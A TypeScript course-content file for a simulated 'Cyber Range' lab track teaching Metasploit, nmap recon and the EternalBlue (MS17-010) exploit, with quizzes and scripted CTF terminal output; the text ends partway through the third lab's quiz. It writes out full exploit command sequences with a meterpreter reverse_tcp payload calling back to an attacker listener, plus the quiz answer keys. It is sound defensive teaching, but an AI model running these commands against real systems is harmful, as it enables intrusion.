import type { EpochConfig, StageConfig } from "./types";

// ── Cyber Range: Metasploit — Recon to Root ──────────────────────────────────
// The first epoch of the "Cyber Range" track: hands-on offensive-tool labs that
// teach the fundamentals of the real toolchain (Metasploit, nmap, Meterpreter)
// through a simulated-but-faithful red-team kill chain against a vulnerable
// Windows target (MS17-010 / EternalBlue). The in-browser terminal scripts the
// real commands, outputs, and the attacker→target pivot — teaching the tradecraft
// without a live VM. Content is authored so the same labs could later be backed
// by real sandboxes without re-writing the stages.
//
// All material is built from public sources (Rapid7/Metasploit docs, the MS17-010
// advisory, public WannaCry reporting). It teaches authorized, defensive-minded
// use: every lab pairs the offense with the blue-team detection + fix.

export const rangeMetasploitEpoch: EpochConfig = {
  id: "range-metasploit",
  name: "Metasploit: Recon to Root",
  subtitle: "Hands-on red-team exploitation — the EternalBlue kill chain",
  description:
    "Learn the world's most-used exploitation framework by using it. A four-lab kill chain: msfconsole fundamentals, nmap recon, the EternalBlue (MS17-010) exploit with a Meterpreter pivot to SYSTEM, and post-exploitation loot — each paired with the blue-team detection and fix.",
  emoji: "🎯",
  color: "Red",
  unlocked: true,
};

export const rangeMetasploitStages: StageConfig[] = [
  // ─── Lab 1: msfconsole fundamentals ─────────────────────────────────────────
  {
    epochId: "range-metasploit",
    wonder: { name: "The Cyber Range", location: "Offensive Security Lab", era: "Present Day", emoji: "🎯" },
    id: "range-msf-01",
    order: 1,
    title: "msfconsole: The Framework",
    subtitle: "The module system + the exploitation workflow",
    category: "cybersecurity",
    xp: 150,
    badge: { id: "badge-range-msf-console", name: "Console Operator", emoji: "🖥️" },
    challengeType: "ctf",
    info: {
      tagline: "Before you exploit anything, learn the weapon — Metasploit's module system and its search → use → set → exploit workflow.",
      year: 2003,
      overview: [
        "Metasploit is the most widely used penetration-testing framework in the world. Created by H.D. Moore in 2003 and now maintained by Rapid7, it turns the messy art of exploitation into a consistent, repeatable workflow: instead of hand-writing a one-off exploit for every target, you load a vetted module, point it at a host, and fire. That same framework is used by red teams, bug-bounty hunters, and — because it ships every public exploit — by attackers, which is exactly why defenders need to understand it.",
        "The framework is organized into module types, each a verb in the attacker's grammar. Exploits take advantage of a specific flaw; payloads are the code that runs after the exploit lands (a reverse shell, or the powerful Meterpreter agent); auxiliary modules scan, fuzz, and brute-force without delivering a payload; post modules run once you already have a session, to loot and pivot; and encoders, nops, and evasion modules help a payload survive antivirus and bad characters. Knowing which module type you need is half of using Metasploit well.",
        "The console — msfconsole — is the cockpit. The loop almost never changes: search for a module, use it to load it, read its info and show options to see what it needs, set the required values (which target, which payload, your listener address), check whether the target looks vulnerable, then exploit. Successful exploitation opens a session you interact with. Master this loop here on a safe range, and the rest of the track is just new targets.",
      ],
      technical: {
        title: "The msfconsole Workflow",
        body: [
          "The seven module types you'll meet, and what each is for:\n- exploit — code that triggers a specific vulnerability (e.g. ms17_010_eternalblue).\n- payload — what runs on success: a reverse shell, a bind shell, or Meterpreter (an in-memory post-exploitation agent).\n- auxiliary — scanners, fuzzers, and brute-forcers that need no payload (e.g. smb_version, ms17_010 scanner).\n- post — modules that run inside an existing session (hashdump, screenshot, pivot routing).\n- encoder / nop / evasion — shape a payload to dodge AV and bad-character filters.",
          "The core command loop, in order:\n- search <term> — find a module by CVE, name, or platform.\n- use <module path> — load it; the prompt changes to show the active module.\n- info — read the description, targets, and references.\n- show options — list required (yes) and optional settings.\n- set RHOSTS / set LHOST / set PAYLOAD … — fill in the blanks.\n- check — ask the target whether it appears vulnerable (non-intrusive, where supported).\n- exploit (or run) — launch; on success a session opens.\n- sessions -i <id> — interact with an open session.",
          "Two habits that separate operators from button-pushers: always read info and check before you exploit (so you know what the module does and whether it will work), and keep a workspace/database (db_nmap, hosts, services) so your recon feeds your exploitation instead of living in scattered notes.",
        ],
        codeExample: {
          label: "A canonical msfconsole session",
          code: `$ msfconsole -q
msf6 > search ms17-010
   #  Name                                           Disclosure  Rank
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14  average
   3  auxiliary/scanner/smb/smb_ms17_010             -           normal

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info        # description, targets, refs
msf6 exploit(ms17_010_eternalblue) > show options
   Name     Current Setting  Required  Description
   RHOSTS                    yes       The target host(s)
   LHOST                     yes       The listen address (your box)

msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.5
msf6 exploit(ms17_010_eternalblue) > check       # is it vulnerable?
msf6 exploit(ms17_010_eternalblue) > exploit     # fire → session opens`,
        },
      },
      incident: {
        title: "From Open-Source Tool to Industry Standard",
        when: "2003 (first release) → present (Rapid7)",
        where: "Penetration testing, red teaming, security research, and adversary tradecraft worldwide",
        impact: "Standardized exploitation into a repeatable workflow; ships thousands of public exploits used by defenders and attackers alike",
        body: [
          "When H.D. Moore released Metasploit in 2003, exploitation was artisanal — every tester hoarded private scripts. Metasploit made exploits modular, documented, and shareable, and the industry reorganized around it: certifications (OSCP, PenTest+), tooling, and even defensive products now assume familiarity with it.",
          "That openness is double-edged. The same framework that lets a defender validate 'is this box actually exploitable?' hands a novice attacker a working exploit for every published CVE. This is why understanding Metasploit is a defensive skill as much as an offensive one — you cannot detect or prioritize what you do not understand. Every lab in this track ends with the blue-team side for exactly that reason.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Operator", sub: "msfconsole", type: "attacker" },
          { label: "Module DB", sub: "exploit / payload / aux / post", type: "system" },
          { label: "search → use → set", sub: "configure the attack", type: "victim" },
          { label: "exploit → session", sub: "interactive foothold", type: "result" },
        ],
      },
      timeline: [
        { year: 2003, event: "H.D. Moore releases the Metasploit Framework", highlight: true },
        { year: 2007, event: "Framework rewritten in Ruby; module ecosystem explodes" },
        { year: 2009, event: "Rapid7 acquires Metasploit; commercial + community editions" },
        { year: 2017, event: "Meterpreter + community modules make it the red-team standard" },
      ],
      keyTakeaways: [
        "Metasploit organizes exploitation into module types: exploit, payload, auxiliary, post, encoder/nop/evasion",
        "The workflow is always: search → use → info → show options → set → check → exploit → session",
        "Meterpreter is a payload — an in-memory post-exploitation agent, not the exploit itself",
        "Reading info and running check before exploit is what separates operators from button-pushers",
        "Understanding the framework is a defensive skill: you can't detect what you don't understand",
      ],
      references: [
        { title: "Metasploit Unleashed (Offensive Security)", url: "https://www.offsec.com/metasploit-unleashed/" },
        { title: "Rapid7 — Metasploit Framework", url: "https://docs.rapid7.com/metasploit/" },
      ],
    },
    quiz: {
      questions: [
        { id: "range-msf-01-q1", type: "Fundamentals", challenge: "Module type.", text: "In Metasploit, what is a 'payload'?", options: ["The code that runs on the target after the exploit succeeds (e.g. a reverse shell or Meterpreter)", "The vulnerability scanner", "The msfconsole prompt", "The target's IP address"], correctIndex: 0, explanation: "The exploit triggers the flaw; the payload is what executes afterward — commonly Meterpreter or a reverse shell." },
        { id: "range-msf-01-q2", type: "Workflow", challenge: "Load a module.", text: "Which command loads a specific module so it becomes the active context?", options: ["use <module path>", "run <module path>", "load <module path>", "exec <module path>"], correctIndex: 0, explanation: "`use` selects the module; the prompt then changes to show the active module." },
        { id: "range-msf-01-q3", type: "Workflow", challenge: "See what's needed.", text: "Which command lists a module's required and optional settings?", options: ["show options", "info -v", "set --list", "options show"], correctIndex: 0, explanation: "`show options` lists each setting, whether it's Required (yes), and its current value." },
        { id: "range-msf-01-q4", type: "Module Types", challenge: "No payload needed.", text: "A module that scans or brute-forces without delivering a payload is which type?", options: ["auxiliary", "exploit", "post", "encoder"], correctIndex: 0, explanation: "Auxiliary modules (scanners, fuzzers, brute-forcers) do work that doesn't need a payload." },
        { id: "range-msf-01-q5", type: "Meterpreter", challenge: "What is it.", text: "What is Meterpreter?", options: ["An in-memory post-exploitation payload/agent with a rich command set", "A network scanner", "A Windows service", "An exploit for SMB"], correctIndex: 0, explanation: "Meterpreter is a powerful, stealthy in-memory agent used as the payload for post-exploitation." },
        { id: "range-msf-01-q6", type: "Safety", challenge: "Before firing.", text: "What does the `check` command do?", options: ["Non-intrusively asks whether the target appears vulnerable, where supported", "Deletes the target's logs", "Launches the exploit immediately", "Sets RHOSTS automatically"], correctIndex: 0, explanation: "`check` reports likely vulnerability without exploiting — good practice before `exploit`." },
        { id: "range-msf-01-q7", type: "Settings", challenge: "Your listener.", text: "When using a reverse payload, what does LHOST specify?", options: ["The attacker's listening address the payload connects back to", "The target's IP", "The exploit's CVE", "The payload encoder"], correctIndex: 0, explanation: "Reverse payloads call home to LHOST (your box); RHOSTS is the target." },
        { id: "range-msf-01-q8", type: "Concept", challenge: "Why defenders learn it.", text: "Why should a defender understand Metasploit?", options: ["You can't detect or prioritize attacks you don't understand, and it ships every public exploit", "It's required to run a firewall", "It encrypts data at rest", "It replaces a SIEM"], correctIndex: 0, explanation: "Knowing the standard offensive toolchain is essential to detection, prioritization, and validation." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: { ip: "10.10.10.40", hostname: "win7-target", os: "Windows 7 SP1 (x64)", openPorts: "135, 139, 445", vulnerability: "(unconfirmed — recon next lab)" },
      scenario: "Welcome to the range. Before you exploit a single host, learn the weapon. Open msfconsole, learn its module system, and walk the search → use → set → exploit workflow. Collect the flag fragments as you go.",
      hint: "Read the briefing, then explore the module system and the workflow with the range's guided commands.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Learn the Metasploit module types. Run: msf-modules",
        "Learn the exploitation workflow. Run: msf-workflow",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{MSF_", label: "Range Briefing — Learn the Framework" },
        { trigger: "msf-modules", value: "M0DUL3S_", label: "Module System Learned" },
        { trigger: "msf-workflow", value: "W0RKFL0W}", label: "Exploitation Workflow Learned" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE LAB 1 — msfconsole: THE FRAMEWORK",
          "Objective: learn Metasploit's module system + workflow.",
          "",
          "Metasploit = the standard exploitation framework (Rapid7).",
          "Sequence: msf-modules -> msf-workflow -> assemble",
          "",
          "No target is exploited in this lab — you're learning the cockpit.",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "msf-modules": (_args: string[]) => ({
          lines: [
            "$ msfconsole -q",
            "msf6 > show -h    (module taxonomy)",
            "",
            "  exploit    code that triggers a specific vulnerability",
            "  payload    what runs on success (reverse shell / meterpreter)",
            "  auxiliary  scanners, fuzzers, brute-forcers (no payload)",
            "  post       run inside an existing session (loot, pivot)",
            "  encoder    reshape a payload to dodge bad chars / AV",
            "  nop        no-op sleds for buffer alignment",
            "  evasion    AV/EDR evasion wrappers",
            "",
            ">> LEARN: pick the right module TYPE first",
            "   You exploit with an 'exploit', land a 'payload' (usually meterpreter),",
            "   then loot with 'post'. Scanners that need no payload are 'auxiliary'.",
            "   Fragment collected.",
          ],
        }),
        "msf-workflow": (_args: string[]) => ({
          lines: [
            "THE LOOP (memorize it — it never changes):",
            "  search <term>     find a module by CVE / name / platform",
            "  use <path>        load it (prompt shows the active module)",
            "  info              read description, targets, references",
            "  show options      see Required (yes) vs optional settings",
            "  set RHOSTS <ip>   the target;  set LHOST <ip>  your listener",
            "  set PAYLOAD <p>   e.g. windows/x64/meterpreter/reverse_tcp",
            "  check             is it vulnerable? (non-intrusive)",
            "  exploit           fire -> a session opens on success",
            "  sessions -i <id>  interact with the session",
            "",
            ">> LEARN: read 'info' and run 'check' BEFORE 'exploit'",
            "   Know what the module does and whether it'll work before you fire.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 2: nmap recon ──────────────────────────────────────────────────────
  {
    epochId: "range-metasploit",
    wonder: { name: "The Recon Ridge", location: "Offensive Security Lab", era: "Present Day", emoji: "🛰️" },
    id: "range-msf-02",
    order: 2,
    title: "Recon: Mapping the Target",
    subtitle: "nmap service/version scanning + the MS17-010 surface",
    category: "cybersecurity",
    xp: 150,
    badge: { id: "badge-range-msf-recon", name: "Reconnaissance", emoji: "🛰️" },
    challengeType: "ctf",
    info: {
      tagline: "You can't exploit what you can't see — use nmap to find the target's services, OS, and the SMB flaw that gets you in.",
      year: 1997,
      overview: [
        "Reconnaissance is the first and most decisive phase of any engagement: every later step depends on knowing what's actually running. nmap — written by Gordon 'Fyodor' Lyon in 1997 and still the standard — sweeps a host or network to discover live systems, open ports, the services and versions behind them, the operating system, and, with its scripting engine, specific vulnerabilities. A good operator spends far more time here than on the exploit itself, because a precise map turns a blind guess into a sure shot.",
        "For this target, recon is looking for one thing in particular: SMB. Server Message Block is Windows file/printer sharing, exposed on TCP ports 139 and 445. The legacy SMBv1 protocol carried the MS17-010 family of flaws — the bugs the NSA's EternalBlue exploit and the WannaCry worm rode to infect hundreds of thousands of machines. A version scan that finds 445 open on an unpatched Windows 7 box, confirmed by nmap's smb-vuln-ms17-010 script, tells you exactly which exploit to load next.",
        "Recon also feeds the framework. In a real engagement you'd run db_nmap from inside msfconsole so the results populate Metasploit's hosts and services database, letting your exploitation phase query the map instead of re-typing IPs. The discipline is the same whether the data lands in a notebook or a database: enumerate fully, then choose the smallest, surest path in.",
      ],
      technical: {
        title: "nmap Scanning + SMB Enumeration",
        body: [
          "The scan types you'll reach for most:\n- -sS — fast stealth SYN scan (default for port discovery).\n- -sV — probe open ports to identify the service and version (the key to choosing an exploit).\n- -O — OS detection from TCP/IP fingerprinting.\n- -p- — scan all 65,535 ports (don't assume the default 1,000 is enough).\n- --script <name> — run Nmap Scripting Engine (NSE) scripts, including vuln checks.",
          "SMB is the target surface here:\n- TCP 139 — SMB over NetBIOS (legacy).\n- TCP 445 — SMB directly over TCP (modern, and the EternalBlue port).\n- nmap --script smb-vuln-ms17-010 -p445 <ip> — the NSE check that confirms a host is vulnerable to MS17-010 before you ever load Metasploit.",
          "Feeding recon into Metasploit: msf6 > db_nmap -sV -p- <ip> runs nmap and stores results in the workspace, so hosts, services, and vulns commands let your exploitation phase work from the map. Recon you can't query is recon you'll re-do.",
        ],
        codeExample: {
          label: "Recon to MS17-010 confirmation",
          code: `# Full service/version + OS scan
$ nmap -sV -O 10.10.10.40
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows 7 SP1 (SMBv1 enabled)
OS: Microsoft Windows 7 SP1

# Confirm the specific vulnerability with NSE
$ nmap --script smb-vuln-ms17-010 -p445 10.10.10.40
| smb-vuln-ms17-010:
|   VULNERABLE: Remote Code Execution (MS17-010)
|   State: VULNERABLE
|_  Risk factor: HIGH  (CVE-2017-0143 .. -0148)`,
        },
      },
      incident: {
        title: "Recon as the Force Multiplier",
        when: "1997 (nmap release) → present",
        where: "Every penetration test, red-team engagement, and — inverted — every attacker's pre-attack staging",
        impact: "Determines the entire attack path; a missed open port or unscanned service is a missed (or unmissed) compromise",
        body: [
          "Fyodor's nmap turned host discovery from guesswork into a science, and it remains the first tool reached for in essentially every engagement. Its scripting engine (NSE) later folded vulnerability detection into recon, so a single command can both find SMB and tell you it's EternalBlue-vulnerable.",
          "The defensive mirror image matters: the same scan that maps your weak SMB host for an attacker is the scan your own team should be running continuously. Asset inventory and exposure management exist precisely because the side that maps the network best usually wins. If an attacker can find your unpatched, internet-or-LAN-reachable SMBv1 box, so can you — first.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Operator", sub: "nmap -sV -O", type: "attacker" },
          { label: "Win7 Target", sub: "10.10.10.40", type: "system" },
          { label: "445/tcp SMBv1", sub: "smb-vuln-ms17-010", type: "victim" },
          { label: "Confirmed Vulnerable", sub: "→ choose EternalBlue", type: "result" },
        ],
      },
      timeline: [
        { year: 1997, event: "Fyodor releases nmap in Phrack magazine" },
        { year: 2007, event: "Nmap Scripting Engine (NSE) adds vulnerability detection" },
        { year: 2017, event: "smb-vuln-ms17-010 NSE script ships amid the EternalBlue/WannaCry wave", highlight: true },
      ],
      keyTakeaways: [
        "Recon decides the engagement: -sV (version) and OS detection drive exploit choice",
        "SMB lives on TCP 139/445; port 445 + SMBv1 is the EternalBlue surface",
        "nmap --script smb-vuln-ms17-010 confirms MS17-010 before you load Metasploit",
        "db_nmap stores results in the Metasploit workspace so exploitation can query the map",
        "Defenders should run the same scans first — exposure management is recon turned inward",
      ],
      references: [
        { title: "Nmap Reference Guide", url: "https://nmap.org/book/man.html" },
        { title: "NSE — smb-vuln-ms17-010", url: "https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html" },
      ],
    },
    quiz: {
      questions: [
        { id: "range-msf-02-q1", type: "Recon", challenge: "Service versions.", text: "Which nmap flag identifies the service and version behind an open port?", options: ["-sV", "-sn", "-Pn", "-oA"], correctIndex: 0, explanation: "`-sV` performs version detection — essential for matching a service to an exploit." },
        { id: "range-msf-02-q2", type: "SMB", challenge: "The port.", text: "Which TCP port is modern SMB (and the EternalBlue target) on?", options: ["445", "139", "143", "389"], correctIndex: 0, explanation: "SMB over TCP runs on 445 (139 is the legacy NetBIOS path)." },
        { id: "range-msf-02-q3", type: "NSE", challenge: "Confirm the flaw.", text: "How do you confirm MS17-010 with nmap before loading Metasploit?", options: ["nmap --script smb-vuln-ms17-010 -p445 <ip>", "nmap -sn <ip>", "nmap -O <ip> only", "nmap -p80 <ip>"], correctIndex: 0, explanation: "The smb-vuln-ms17-010 NSE script reports VULNERABLE without exploiting." },
        { id: "range-msf-02-q4", type: "Coverage", challenge: "All ports.", text: "What does the -p- flag do?", options: ["Scans all 65,535 TCP ports, not just the default 1,000", "Scans only port 0", "Disables port scanning", "Pings the host"], correctIndex: 0, explanation: "`-p-` scans every port — services on high ports are easy to miss otherwise." },
        { id: "range-msf-02-q5", type: "Integration", challenge: "Feed the framework.", text: "What does running db_nmap inside msfconsole accomplish?", options: ["Runs nmap and stores hosts/services in the Metasploit workspace database", "Deletes the scan results", "Launches an exploit", "Encrypts the target"], correctIndex: 0, explanation: "db_nmap populates the workspace so exploitation can query hosts/services/vulns." },
        { id: "range-msf-02-q6", type: "Protocol", challenge: "What is SMB.", text: "What is SMB?", options: ["Windows file/printer sharing protocol", "A web framework", "An email protocol", "A database engine"], correctIndex: 0, explanation: "Server Message Block handles Windows file/printer sharing; SMBv1 carried MS17-010." },
        { id: "range-msf-02-q7", type: "OS Detection", challenge: "Fingerprint.", text: "Which flag attempts operating-system detection?", options: ["-O", "-sU", "-T4", "-A only"], correctIndex: 0, explanation: "`-O` performs OS detection via TCP/IP stack fingerprinting." },
        { id: "range-msf-02-q8", type: "Defense", challenge: "Blue-team recon.", text: "Why should defenders run these same scans?", options: ["To find exposed/vulnerable services before an attacker does (exposure management)", "To slow the network down", "Because nmap encrypts traffic", "It is required by SMB"], correctIndex: 0, explanation: "Finding your own unpatched SMB host first is the whole point of exposure management." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: { ip: "10.10.10.40", hostname: "win7-target", os: "Windows 7 SP1 (x64)", openPorts: "135, 139, 445", vulnerability: "MS17-010 — SMBv1 RCE (to be confirmed)" },
      scenario: "A Windows 7 host sits on the lab network at 10.10.10.40. Map it. Find the SMB service, fingerprint the OS, and confirm whether it carries the MS17-010 flaw — so you know exactly which exploit to load in the next lab.",
      hint: "Scan for services and OS, then run the SMB vulnerability script against port 445.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Service + version + OS scan. Run: nmap 10.10.10.40",
        "Confirm the SMB flaw with NSE. Run: nmap-vuln 10.10.10.40",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{R3C0N_", label: "Recon Briefing" },
        { trigger: "nmap 10.10.10.40", value: "SMB445_", label: "SMB on 445 Discovered — Windows 7" },
        { trigger: "nmap-vuln 10.10.10.40", value: "MS17_010}", label: "MS17-010 Confirmed VULNERABLE" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE LAB 2 — RECON",
          "Target: 10.10.10.40 (host on the lab network)",
          "Goal: enumerate services + OS, confirm the exploitable flaw.",
          "",
          "Sequence: nmap 10.10.10.40 -> nmap-vuln 10.10.10.40 -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "nmap": (args: string[]) => {
          if (args[0] !== "10.10.10.40") return { lines: ["Usage: nmap 10.10.10.40", "Scan the lab target."] };
          return {
            lines: [
              "$ nmap -sV -O 10.10.10.40",
              "Starting Nmap — scanning 10.10.10.40 ...",
              "PORT     STATE SERVICE       VERSION",
              "135/tcp  open  msrpc         Microsoft Windows RPC",
              "139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn",
              "445/tcp  open  microsoft-ds  Windows 7 SP1 (SMBv1 enabled)",
              "OS details: Microsoft Windows 7 SP1",
              "",
              ">> LEARN: 445/tcp + SMBv1 + Windows 7 = the EternalBlue surface",
              "   -sV gave you the version (the key to picking an exploit);",
              "   -O fingerprinted the OS. Next: confirm the specific CVE.",
              "   Fragment collected.",
            ],
          };
        },
        "nmap-vuln": (args: string[]) => {
          if (args[0] !== "10.10.10.40") return { lines: ["Usage: nmap-vuln 10.10.10.40"] };
          return {
            lines: [
              "$ nmap --script smb-vuln-ms17-010 -p445 10.10.10.40",
              "| smb-vuln-ms17-010:",
              "|   VULNERABLE: Remote Code Execution (MS17-010)",
              "|   State: VULNERABLE",
              "|   IDs: CVE-2017-0143, -0144, -0145, -0146, -0147, -0148",
              "|_  Risk factor: HIGH",
              "",
              ">> LEARN: confirm before you exploit",
              "   The NSE script proves MS17-010 without firing the exploit —",
              "   now you know exactly which Metasploit module to load.",
              "   Run 'assemble' to view the flag and the submit command.",
            ],
          };
        },
      },
    },
  },

  // ─── Lab 3: EternalBlue — the exploit + pivot ───────────────────────────────
  {
    epochId: "range-metasploit",
    wonder: { name: "Shadow Brokers", location: "NSA / The Equation Group", era: "2017 CE", emoji: "💥" },
    id: "range-msf-03",
    order: 3,
    title: "EternalBlue: Pop the Box",
    subtitle: "MS17-010 → Meterpreter → SYSTEM",
    category: "cybersecurity",
    cveId: "CVE-2017-0144",
    cvssScore: 8.1,
    xp: 200,
    badge: { id: "badge-range-msf-eternalblue", name: "EternalBlue", emoji: "💥" },
    challengeType: "ctf",
    info: {
      tagline: "Load the NSA's leaked SMBv1 exploit, fire it, and pivot into a Meterpreter session running as SYSTEM — the full red-team foothold.",
      year: 2017,
      overview: [
        "EternalBlue is the exploit that defined modern red teaming. Developed by the NSA's Equation Group and leaked by the Shadow Brokers in April 2017, it abuses MS17-010 — a flaw in how Microsoft's SMBv1 protocol handled specially crafted packets — to achieve unauthenticated remote code execution on Windows. Within weeks the WannaCry ransomware worm weaponized it to infect over 200,000 machines across 150 countries, crippling the UK's NHS and shutting down factories worldwide. It remains the canonical example of a single unpatched service becoming a global catastrophe.",
        "Mechanically, the exploit is a pool-corruption bug. SMBv1's handling of a crafted message triggers a buffer overflow in the Windows kernel's non-paged pool, which the exploit grooms to overwrite kernel structures and execute attacker code in kernel context. Because the flaw is pre-authentication and the payload runs at the highest privilege, a successful hit lands you straight at NT AUTHORITY\\SYSTEM — no password, no privilege escalation, total control. That is why EternalBlue scored so high and spread so fast.",
        "In Metasploit the whole chain is four commands. You use the eternalblue module, set RHOSTS to the target and LHOST to your listener, choose a Meterpreter reverse payload, and exploit. On success the framework opens a Meterpreter session and your terminal pivots into the target — from here you run getuid to confirm SYSTEM, sysinfo to confirm the host, and you own the box. This lab walks that exact sequence against the confirmed-vulnerable host from your recon.",
      ],
      technical: {
        title: "EternalBlue (MS17-010) Exploitation Mechanics",
        body: [
          "Why it's so dangerous:\n- Pre-authentication — no credentials are needed; reaching TCP/445 is enough.\n- Kernel-level — the overflow is in the Windows kernel's non-paged pool, so code runs in kernel context.\n- SYSTEM by default — the payload executes as NT AUTHORITY\\SYSTEM, skipping any privilege-escalation step.\n- Wormable — no user interaction, so it self-propagates (this is what made WannaCry/NotPetya spread).",
          "The Metasploit sequence:\n- use exploit/windows/smb/ms17_010_eternalblue\n- set RHOSTS 10.10.10.40 — the target confirmed vulnerable in recon.\n- set LHOST 10.10.14.5 — your listener; the reverse payload connects back here.\n- set PAYLOAD windows/x64/meterpreter/reverse_tcp — an in-memory agent.\n- check, then exploit — the framework grooms the pool, lands the payload, and opens a Meterpreter session.",
          "After the session opens, the prompt becomes meterpreter > and you are inside the target:\n- getuid — confirms you are NT AUTHORITY\\SYSTEM.\n- sysinfo — host name, OS, architecture.\n- shell — drop to a native cmd.exe if you need it.\nFrom here, post-exploitation (next lab) is looting, persistence, and pivoting deeper.",
        ],
        codeExample: {
          label: "The EternalBlue kill chain in Metasploit",
          code: `msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.5
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > check
[+] 10.10.10.40:445 - The target is vulnerable.
msf6 exploit(ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.10.14.5:4444
[+] 10.10.10.40:445 - =-=-=-WIN-=-=-=  (pool grooming succeeded)
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.40:49158)

meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM`,
        },
      },
      incident: {
        title: "WannaCry — EternalBlue Goes Global (2017)",
        when: "April 14, 2017 (leak) → May 12, 2017 (WannaCry outbreak)",
        where: "150+ countries — UK NHS, Telefónica, FedEx, Renault, Deutsche Bahn, and 200,000+ machines",
        impact: "Estimated $4–8 billion in damages; hospitals diverted patients; one unpatched protocol crippled critical infrastructure worldwide",
        body: [
          "Microsoft patched MS17-010 in March 2017 (MS17-010 / bulletin), a month before the Shadow Brokers dumped EternalBlue publicly on April 14. The window between patch and weaponization was the whole story: organizations that hadn't applied the update — because SMBv1 was legacy, embedded, or simply unpatched — were exposed. On May 12, the WannaCry worm chained EternalBlue (to spread) with ransomware (to extort), and because the exploit needs no user interaction, it tore through flat networks automatically.",
          "The lessons are still the syllabus: patch internet- and LAN-reachable services on the timeline of the threat, not the maintenance calendar; kill legacy protocols like SMBv1 outright; and segment networks so a wormable exploit can't reach every host from one foothold. A month-old patch would have stopped the largest ransomware event in history — which is exactly why every lab in this track ends with the fix.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Operator (Kali)", sub: "ms17_010_eternalblue", type: "attacker" },
          { label: "SMBv1 / 445", sub: "kernel pool overflow", type: "system" },
          { label: "Meterpreter payload", sub: "reverse_tcp → LHOST", type: "victim" },
          { label: "NT AUTHORITY\\SYSTEM", sub: "full kernel-level control", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "Mar 14: Microsoft patches MS17-010 (a month before the leak)" },
        { year: 2017, event: "Apr 14: Shadow Brokers leak EternalBlue publicly", highlight: true },
        { year: 2017, event: "May 12: WannaCry worm uses EternalBlue — 200,000+ machines, 150+ countries" },
        { year: 2017, event: "Jun 27: NotPetya reuses EternalBlue for destructive wiper attacks" },
      ],
      keyTakeaways: [
        "EternalBlue exploits MS17-010 in SMBv1 for pre-auth, kernel-level RCE landing at SYSTEM",
        "The Metasploit chain is four commands: use → set RHOSTS/LHOST/PAYLOAD → check → exploit",
        "A successful hit opens a Meterpreter session and pivots you into the target as SYSTEM",
        "It's wormable (no user interaction) — which is why WannaCry/NotPetya spread automatically",
        "A patch existed a month before the leak: patch reachable services on the threat's timeline, kill SMBv1, segment",
      ],
      references: [
        { title: "Microsoft Security Bulletin MS17-010", url: "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" },
        { title: "Rapid7 — ms17_010_eternalblue module", url: "https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/" },
      ],
    },
    quiz: {
      questions: [
        { id: "range-msf-03-q1", type: "The Flaw", challenge: "What it abuses.", text: "EternalBlue (MS17-010) is a flaw in which Windows protocol?", options: ["SMBv1 (Server Message Block v1)", "RDP", "HTTP", "Kerberos"], correctIndex: 0, explanation: "MS17-010 is a set of SMBv1 vulnerabilities enabling remote code execution." },
        { id: "range-msf-03-q2", type: "Privilege", challenge: "Where you land.", text: "What privilege level does a successful EternalBlue payload run at?", options: ["NT AUTHORITY\\SYSTEM (kernel/highest privilege)", "Guest", "A standard user", "Read-only"], correctIndex: 0, explanation: "The exploit runs in kernel context, landing the payload as SYSTEM — no privesc needed." },
        { id: "range-msf-03-q3", type: "Access", challenge: "Auth required?", text: "Does EternalBlue require valid credentials?", options: ["No — it is pre-authentication; reaching TCP/445 is enough", "Yes, a domain admin", "Yes, any local user", "Only physical access"], correctIndex: 0, explanation: "It's unauthenticated; that's what made it wormable and catastrophic." },
        { id: "range-msf-03-q4", type: "Workflow", challenge: "The module.", text: "Which Metasploit module fires EternalBlue?", options: ["exploit/windows/smb/ms17_010_eternalblue", "auxiliary/scanner/portscan/tcp", "post/windows/gather/hashdump", "exploit/multi/handler"], correctIndex: 0, explanation: "That exploit module delivers the MS17-010 EternalBlue attack." },
        { id: "range-msf-03-q5", type: "Payload", challenge: "Reverse connection.", text: "With windows/x64/meterpreter/reverse_tcp, who connects to whom?", options: ["The target connects back to the attacker's LHOST", "The attacker connects to the target's RHOSTS", "Nobody connects", "DNS resolves the flag"], correctIndex: 0, explanation: "A reverse payload calls home to LHOST, which is friendlier to firewalls/NAT." },
